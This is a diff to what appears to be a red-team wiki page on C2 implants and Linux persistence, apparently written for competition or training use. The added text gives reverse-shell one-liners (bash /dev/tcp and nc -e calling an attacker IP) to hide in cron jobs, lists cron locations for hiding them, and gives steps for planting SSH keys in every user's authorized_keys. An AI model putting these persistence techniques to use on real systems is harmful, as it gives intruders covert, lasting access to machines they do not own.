@@ -5,11 +5,30 @@ The C2 implant of choice for CU at the time of writing is [[Sliver C2]]. You can
 
 [[MSFVenom]] also contains functionality for binding malware to legitimate executables. However, this must be done in conjunction with [[Evasion]] as all MSFVenom payloads and TTPs are well signatured. 
 
-## Persistence via LOL
-- Linux
-	- Cron jobs
-	- Install and enable new service
-	- Malicious user acct or ssh keys
+## Persistence via LOL (Living off the Land)
+#### Linux
+- Install and enable new service
+- Malicious user acct
+###### Cron jobs: 
+- Put a reverse shell in a cron job. This is the classic reverse shell string: 
+  `/bin/bash -i > /dev/tcp/<attacker-IP>/<port> 0<&1 2>&1`
+- If the victim machine has the traditional version of netcat installed, then this would work as well: `nc -e /bin/bash <ATTACKER_IP> <PORT>`
+These are all the places you can hide cron jobs:
+- `/var/spool/cron/crontabs/` — per-user cron jobs
+- `/etc/crontab` — system crontab file, this will have references to all the other system crontab files below
+- `/etc/cron.d/`
+- `/etc/cron.hourly/`
+- `/etc/cron.daily/`
+- `/etc/cron.weekly/`
+- `/etc/cron.monthly/`
+
+###### SSH Keys:
+- If you don't have an SSH key, generate one with `ssh-keygen`. 
+- Add your public key to the `~/.ssh/authorized_keys` file in every user's directory. Create the file if it isn't already present, then add a new line in the file and put your public key there.
+- Set the permissions on the file and directory by running `chmod 700 ~/.ssh` and 
+  `chmod 600 ~/.ssh/authorized_keys`
+- 
+
 - Windows
 	- Registry Run Keys
 	- Scheduled Tasks
